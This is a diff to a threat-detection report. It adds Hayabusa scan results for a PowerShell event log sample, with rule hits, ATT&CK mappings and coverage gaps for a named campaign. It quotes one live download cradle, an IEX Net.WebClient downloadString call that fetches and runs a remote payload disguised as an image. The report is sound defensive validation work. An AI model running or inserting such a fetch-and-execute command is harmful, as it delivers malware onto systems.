@@ -74,4 +74,27 @@
 ---
 
 ## Detection Results
-_(populated during simulation / EVTX scan / SIEM validation)_
+
+### Hayabusa scan — 2026-07-19
+
+**File:** `evtx/ID4103-4104-Payload-download-via-PowerShell.evtx` (Module sample)
+**Engine:** hayabusa 1.28.1 `json-timeline` · **Host:** `fs03vuln.offsec.lan` · **User:** `OFFSEC\admmig` · **Event time:** 2022-01-24 12:11:11 -08:00
+**Channel covered:** `Microsoft-Windows-PowerShell/Operational` only
+
+| Severity | Rule | EID | Rule ID |
+|----------|------|-----|---------|
+| High | Suspicious PowerShell Invocations - Specific | 4104 | 8655ba53-c937-dbcf-91c5-3125219b9497 |
+| Informational | PwSh Scriptblock (x2) | 4104 | 0f3b1343-65a5-4879-b512-9d61b0e4e3ba |
+| Informational | PwSh Pipeline Exec | 4103 | d3fb8f7b-88b0-4ff4-bf9b-ca286ce19031 |
+
+**High-severity payload (download cradle):**
+```
+IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')
+```
+
+**ATT&CK mapping:**
+- T1059.001 — Command & Scripting Interpreter: PowerShell (powershell.exe v4.0, ConsoleHost, IEX)
+- T1105 — Ingress Tool Transfer (`Net.WebClient.downloadString` fetching remote payload disguised as .png)
+- T1204.002 — User Execution context (interactive host, admin user)
+
+**Relevance to Screening Serpens:** exercises the **T1105** Phase-1 delivery technique as a PowerShell-based proxy (real campaign used certutil + browser chain). **Coverage gap:** this EVTX only covers `PowerShell/Operational`; the campaign's high-value techniques — AppDomainManager hijacking (T1574.014), DLL side-loading (T1574.002), ETW tamper (T1562.002), scheduled-task persistence (T1053.005) — land in `Sysmon/Operational` (EID 7/13) and `Security` (4688/4698), which are **not** present in this sample. Crown-jewel techniques remain unvalidated.
